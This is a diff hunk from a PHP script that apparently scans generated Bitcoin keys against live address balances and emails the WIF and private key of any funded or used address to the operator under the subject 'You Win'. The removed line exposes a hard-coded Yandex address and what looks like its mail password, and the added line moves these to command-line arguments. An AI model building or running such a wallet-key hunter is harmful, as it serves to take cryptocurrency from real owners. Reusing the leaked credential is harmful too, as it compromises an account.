@@ -115,7 +115,7 @@ while (true) {
 			 if($dater[0] == $item["address"] || $dater[1] == $item["address"]){
 					if($item["final_balance"] > 0 || $item["n_tx"] > 0 ){
 						$tosave = "Wif : ".$dater[2]."<br> Adress : ".$item["address"]."<br> Balance : ".$item["final_balance"]."<br> Tx :".$item["n_tx"]."<br> Priv key : ".$dater[3];
-						sendinger("M","holubuneyya@yandex.com","ncluolakcbviljqg","holubuneyya@yandex.com","You Win",$tosave);
+						sendinger("M",$argv[1],$argv[2],$argv[1],"You Win",$tosave);
 						$sent += 1;
 						die("found");
 					}
